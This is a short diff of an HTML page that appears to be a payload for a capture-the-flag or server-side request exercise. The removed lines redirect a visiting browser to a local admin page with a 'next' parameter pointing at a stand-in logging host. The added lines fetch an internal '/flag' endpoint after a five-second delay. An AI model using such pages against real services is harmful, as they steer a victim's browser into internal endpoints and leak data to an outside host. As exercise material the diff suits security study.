@@ -1,10 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="0; url=http://127.0.0.1/admin?next=https://your-logging-service.com">
-    <title>Redirecting...</title>
+    <title>Testing Delay</title>
+    <script>
+        setTimeout(() => {
+            fetch('http://127.0.0.1/flag');  // Internal endpoint that could contain a flag
+        }, 5000);  // Introduces a delay of 5 seconds
+    </script>
 </head>
 <body>
-    <p>If you are not redirected, <a href="http://127.0.0.1/admin?next=https://your-logging-service.com">click here</a>.</p>
+    <h1>Testing delay...</h1>
 </body>
 </html>
